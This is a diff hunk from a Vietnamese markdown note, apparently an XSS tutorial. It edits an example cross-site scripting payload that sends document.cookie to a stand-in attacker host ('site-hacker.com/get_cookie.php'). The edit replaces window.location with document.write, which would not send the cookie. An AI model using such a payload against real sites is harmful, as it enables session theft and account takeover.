@@ -54,7 +54,7 @@ câu lệnh chuyển tiếp
 
 ```
  - đoạn PHP get cookie
- `<script>window.location=”http://site-hacker.com/get_cookie.php?phpcc=”+document.cookie+”&url=http://myblog.com”;</script>  
+ `<script>document.write=”http://site-hacker.com/get_cookie.php?phpcc=”+document.cookie+”&url=http://myblog.com”;</script>  
 `
  
  ```
